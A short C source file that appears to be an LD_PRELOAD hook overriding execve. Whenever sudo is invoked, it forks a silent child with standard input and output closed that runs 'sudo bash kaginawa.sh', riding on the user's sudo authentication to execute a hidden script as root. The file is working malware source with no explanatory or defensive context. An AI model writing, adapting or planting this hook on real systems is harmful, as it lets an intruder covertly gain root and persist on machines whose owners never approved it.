#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>

#define FALSE 0
#define TRUE 1

#define STDIN 0
#define STDOUT 1
#define STDERR 2

static int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
static char *const fake_argv[] = {"sudo", "bash", "kaginawa.sh", NULL};

int execve(const char *pathname, char *const argv[], char *const envp[])
{
    if (original_execve == NULL)
    {
        original_execve = dlsym(RTLD_NEXT, "execve");
    }

    if (strstr(pathname, "sudo"))
    {
        pid_t pid = fork();

        if (pid == 0)
        {
            close(STDIN);
            close(STDOUT);
            close(STDERR);
            original_execve(pathname, &fake_argv[0], envp);
            _exit(0);
        }
    }

    return original_execve(pathname, argv, envp);
}